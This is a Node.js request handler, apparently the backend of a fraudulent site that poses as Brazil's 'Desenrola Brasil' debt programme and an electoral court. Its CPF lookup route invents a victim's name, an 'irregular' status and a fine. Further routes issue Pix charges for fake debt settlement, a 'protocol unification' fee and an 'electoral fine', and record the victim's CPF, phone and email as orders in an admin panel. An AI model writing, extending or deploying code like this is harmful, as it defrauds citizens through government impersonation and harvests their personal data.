const url = require('url');
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');
const adminService = require('../lib/adminService');

const FREEPAY_CONFIG = {
  BASE_URL: process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com',
  PUBLIC_KEY: process.env.FREEPAY_PUBLIC_KEY || '',
  SECRET_KEY: process.env.FREEPAY_SECRET_KEY || ''
};

const configPath = path.join(__dirname, '..', 'freepay_config.json');
if (fs.existsSync(configPath)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    FREEPAY_CONFIG.PUBLIC_KEY = loaded.PUBLIC_KEY || FREEPAY_CONFIG.PUBLIC_KEY;
    FREEPAY_CONFIG.SECRET_KEY = loaded.SECRET_KEY || FREEPAY_CONFIG.SECRET_KEY;
    if (loaded.BASE_URL) FREEPAY_CONFIG.BASE_URL = loaded.BASE_URL;
  } catch(e) {}
}

function getFreePayAuthHeader() {
  const gwConfig = adminService.getGatewayConfig();
  const dbGw = gwConfig.gateways.find(g => g.key === 'freepay');
  const pub = FREEPAY_CONFIG.PUBLIC_KEY || (dbGw ? dbGw.publicKey : '');
  const sec = FREEPAY_CONFIG.SECRET_KEY || (dbGw ? dbGw.secretKey : '');

  if (!pub || !sec) return null;
  const token = Buffer.from(`${pub}:${sec}`).toString('base64');
  return `Basic ${token}`;
}

async function generateQRCodeDataURL(text) {
  try {
    return await QRCode.toDataURL(text, {
      width: 280,
      margin: 1,
      color: { dark: '#000000', light: '#ffffff' }
    });
  } catch(e) {
    return '';
  }
}

const firstNames = ['Carlos', 'Maria', 'Jose', 'Ana', 'Paulo', 'Juliana', 'Marcos', 'Fernanda', 'Lucas', 'Patricia', 'Gabriel', 'Beatriz'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro'];

function generateNameFromCPF(cpfDigits) {
  const n1 = parseInt(cpfDigits.slice(0, 3), 10) || 0;
  const n2 = parseInt(cpfDigits.slice(3, 6), 10) || 0;
  const n3 = parseInt(cpfDigits.slice(6, 9), 10) || 0;
  return `${firstNames[n1 % firstNames.length]} ${lastNames[n2 % lastNames.length]} ${lastNames[n3 % lastNames.length]}`;
}

function generatePixPayload(amount, identifier, name = 'DESENROLA BRASIL') {
  const formattedAmount = Number(amount).toFixed(2);
  return `00020126580014br.gov.bcb.pix0136${identifier || 'a7b8c9d0-1234-5678-90ab-cdef12345678'}520400005303986540${formattedAmount.length.toString().padStart(2, '0')}${formattedAmount}5802BR59${name.length.toString().padStart(2, '0')}${name}6008BRASILIA62070503***6304ABCD`;
}

async function createFreePayTransaction({ amount, name, cpf, phone, email, title }) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    payment_method: 'pix',
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      document: { number: cleanCpf, type: 'cpf' },
      phone: cleanPhone
    },
    items: [
      {
        title: title || 'Quitação de Dívidas - Programa Desenrola Brasil',
        unit_price: amountCents,
        quantity: 1,
        tangible: false
      }
    ],
    metadata: { order_id: 'ORD_' + Date.now(), cpf: cleanCpf },
    pix: { expires_in_days: 1 }
  };

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    return await res.json();
  } catch (err) {
    return null;
  }
}

async function checkFreePayStatus(transactionId) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/info/${transactionId}`, {
      method: 'GET',
      headers: { 'Authorization': authHeader }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/+$/, '') || '/';
  const method = req.method;

  let bodyData = req.body;
  if (!bodyData && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
    const buffers = [];
    for await (const chunk of req) { buffers.push(chunk); }
    const raw = Buffer.concat(buffers).toString();
    try { bodyData = JSON.parse(raw); } catch(e) { bodyData = {}; }
  }

  const getAuthToken = () => {
    const auth = req.headers['authorization'] || '';
    if (auth.startsWith('Bearer ')) return auth.slice(7);
    const cookies = req.headers['cookie'] || '';
    const match = cookies.match(/recupera_admin_token=([^;]+)/);
    return match ? match[1] : null;
  };

  // ==========================================
  // ADMIN API ROUTES
  // ==========================================
  if (pathname.startsWith('/api/admin/')) {
    if (pathname === '/api/admin/auth/login' && method === 'POST') {
      const result = adminService.loginAdmin(bodyData?.username, bodyData?.password);
      if (result.success) {
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Set-Cookie': `recupera_admin_token=${result.token}; Path=/; HttpOnly; Max-Age=28800`
        });
      } else {
        res.writeHead(401, { 'Content-Type': 'application/json' });
      }
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/auth/logout' && method === 'POST') {
      const token = getAuthToken();
      const result = adminService.logoutAdmin(token);
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Set-Cookie': 'recupera_admin_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
      });
      res.end(JSON.stringify(result));
      return;
    }

    const token = getAuthToken();
    const session = adminService.validateSession(token);
    if (!session) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Sessão expirada ou não autorizada.' }));
      return;
    }

    if (pathname === '/api/admin/auth/me' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        user: { username: session.username, role: 'Administrador', brand: 'RecuperaBrasil' }
      }));
      return;
    }

    if (pathname === '/api/admin/gateway-config' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getGatewayConfig()));
      return;
    }

    if (pathname === '/api/admin/gateway-config' && method === 'PUT') {
      const result = adminService.updateGatewayConfig(bodyData || {});
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/gateway-test' && method === 'POST') {
      const result = await adminService.testAndActivateGateway(bodyData || {});
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/offers' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getOffers()));
      return;
    }

    if (pathname === '/api/admin/offers' && method === 'POST') {
      try {
        const result = adminService.saveOffer(bodyData || {});
        res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } catch(err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
      return;
    }

    if (pathname.startsWith('/api/admin/offers/') && method === 'DELETE') {
      const offerId = pathname.replace('/api/admin/offers/', '');
      const result = adminService.deleteOffer(offerId);
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/orders' && method === 'GET') {
      const result = adminService.getOrders(parsedUrl.query);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname.startsWith('/api/admin/orders/') && pathname.endsWith('/status') && method === 'PATCH') {
      const orderId = pathname.replace('/api/admin/orders/', '').replace('/status', '');
      adminService.updateOrderStatus(orderId, bodyData?.status || 'PAID');
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, message: 'Status atualizado com sucesso.' }));
      return;
    }

    if (pathname.startsWith('/api/admin/orders/') && method === 'GET') {
      const orderId = pathname.replace('/api/admin/orders/', '');
      const result = adminService.getOrderById(orderId);
      res.writeHead(result.success ? 200 : 404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/metrics' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getMetrics()));
      return;
    }
  }

  // ==========================================
  // CLIENT API ROUTES
  // ==========================================
  if (pathname === '/api/check_cpf' && method === 'POST') {
    const rawCpf = (bodyData?.cpf || '').replace(/\D/g, '');
    if (rawCpf.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
      return;
    }

    adminService.recordSessionEvent('consulta');

    const generatedName = rawCpf === '08072703188' ? 'Lucas Machado Gaona' : generateNameFromCPF(rawCpf);
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
    });
    res.end(JSON.stringify({
      success: true,
      cpf: rawCpf,
      nome: generatedName,
      status: 'IRREGULAR',
      multa: 419.55,
      desconto: 68.92
    }));
    return;
  }

  if (pathname === '/generate-pix' && method === 'POST') {
    const amount = 68.92;
    adminService.recordSessionEvent('identidade');

    const freepayRes = await createFreePayTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'Quitação de Dívidas - Programa Desenrola Brasil'
    });

    if (freepayRes && freepayRes.success && freepayRes.data) {
      const item = freepayRes.data;
      const pixCode = item.pix?.qr_code || '';
      const txId = item.id;
      const qrDataUrl = await generateQRCodeDataURL(pixCode);

      adminService.addOrder({
        id: 'ord_' + txId.slice(-6),
        clientName: bodyData?.nome || 'Beneficiário Gov',
        email: bodyData?.email || 'cliente@email.com',
        cpf: bodyData?.cpf,
        phone: bodyData?.telefone,
        amount: amount,
        status: 'PENDING',
        transactionId: txId,
        pixCode: pixCode,
        itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
      });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        pixCode: pixCode,
        pix_code: pixCode,
        pixQrCode: qrDataUrl,
        qr_code_base64: qrDataUrl,
        gateway_id: txId,
        transaction_id: txId,
        transactionId: txId,
        orderId: txId,
        amount: amount
      }));
      return;
    }

    const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
    const qrDataUrl = await generateQRCodeDataURL(pixCode);

    adminService.addOrder({
      id: 'ord_' + gatewayId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      transactionId: gatewayId,
      pixCode: pixCode,
      itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
    });

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: pixCode,
      pix_code: pixCode,
      pixQrCode: qrDataUrl,
      qr_code_base64: qrDataUrl,
      gateway_id: gatewayId,
      transaction_id: gatewayId,
      transactionId: gatewayId,
      orderId: gatewayId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-pix-upsell' && method === 'POST') {
    const amount = 54.92;
    adminService.recordSessionEvent('recebimento');

    const freepayRes = await createFreePayTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
    });

    if (freepayRes && freepayRes.success && freepayRes.data) {
      const item = freepayRes.data;
      const pixCode = item.pix?.qr_code || '';
      const txId = item.id;
      const qrDataUrl = await generateQRCodeDataURL(pixCode);

      adminService.addOrder({
        id: 'ord_' + txId.slice(-6),
        clientName: bodyData?.nome || 'Beneficiário Gov',
        email: bodyData?.email || 'cliente@email.com',
        cpf: bodyData?.cpf,
        phone: bodyData?.telefone,
        amount: amount,
        status: 'PENDING',
        transactionId: txId,
        pixCode: pixCode,
        itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
      });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        pixCode: pixCode,
        pix_code: pixCode,
        qr_code_base64: qrDataUrl,
        pixQrCode: qrDataUrl,
        gateway_id: txId,
        transaction_id: txId,
        transactionId: txId,
        orderId: txId,
        amount: amount
      }));
      return;
    }

    const gatewayId = 'UP_' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const pixCode = generatePixPayload(amount, gatewayId, 'PROTOCOLO UNIFICACAO');
    const qrDataUrl = await generateQRCodeDataURL(pixCode);

    adminService.addOrder({
      id: 'ord_' + gatewayId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      transactionId: gatewayId,
      pixCode: pixCode,
      itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
    });

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: pixCode,
      pix_code: pixCode,
      qr_code_base64: qrDataUrl,
      pixQrCode: qrDataUrl,
      gateway_id: gatewayId,
      transaction_id: gatewayId,
      transactionId: gatewayId,
      orderId: gatewayId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-pix-multa' && method === 'POST') {
    const amount = 67.35;
    adminService.recordSessionEvent('recebimento');

    const freepayRes = await createFreePayTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'Regularização Multa Adicional - Tribunal Eleitoral'
    });

    if (freepayRes && freepayRes.success && freepayRes.data) {
      const item = freepayRes.data;
      const pixCode = item.pix?.qr_code || '';
      const txId = item.id;
      const qrDataUrl = await generateQRCodeDataURL(pixCode);

      adminService.addOrder({
        id: 'ord_' + txId.slice(-6),
        clientName: bodyData?.nome || 'Beneficiário Gov',
        email: bodyData?.email || 'cliente@email.com',
        cpf: bodyData?.cpf,
        phone: bodyData?.telefone,
        amount: amount,
        status: 'PENDING',
        transactionId: txId,
        pixCode: pixCode,
        itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
      });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        pixCode: pixCode,
        pix_code: pixCode,
        qr_code_base64: qrDataUrl,
        pixQrCode: qrDataUrl,
        gateway_id: txId,
        transaction_id: txId,
        transactionId: txId,
        orderId: txId,
        amount: amount
      }));
      return;
    }

    const gatewayId = 'ML_' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const pixCode = generatePixPayload(amount, gatewayId, 'MULTA ELEITORAL');
    const qrDataUrl = await generateQRCodeDataURL(pixCode);

    adminService.addOrder({
      id: 'ord_' + gatewayId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      transactionId: gatewayId,
      pixCode: pixCode,
      itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
    });

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: pixCode,
      pix_code: pixCode,
      qr_code_base64: qrDataUrl,
      pixQrCode: qrDataUrl,
      gateway_id: gatewayId,
      transaction_id: gatewayId,
      transactionId: gatewayId,
      orderId: gatewayId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-qrcode' && method === 'GET') {
    const dataText = parsedUrl.query.data || 'PIX_CODE_PLACEHOLDER';
    QRCode.toBuffer(dataText, { width: 280, margin: 1, type: 'png' }, (err, buffer) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Error generating QR Code');
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'image/png',
        'Cache-Control': 'public, max-age=86400'
      });
      res.end(buffer);
    });
    return;
  }

  if (pathname.startsWith('/check-payment/')) {
    const gatewayId = pathname.replace('/check-payment/', '');
    
    if (gatewayId.length > 20) {
      const freePayData = await checkFreePayStatus(gatewayId);
      if (freePayData && freePayData.success && freePayData.data) {
        const itemStatus = (freePayData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        if (isPaid) {
          adminService.updateOrderStatus(gatewayId, 'PAID');
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    const isApproved = parsedUrl.query.force === '1';
    if (isApproved) {
      adminService.updateOrderStatus(gatewayId, 'PAID');
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      status: isApproved ? 'approved' : 'pending',
      gateway_id: gatewayId,
      message: isApproved ? 'Pagamento Aprovado!' : 'Aguardando pagamento'
    }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Endpoint not found' }));
};
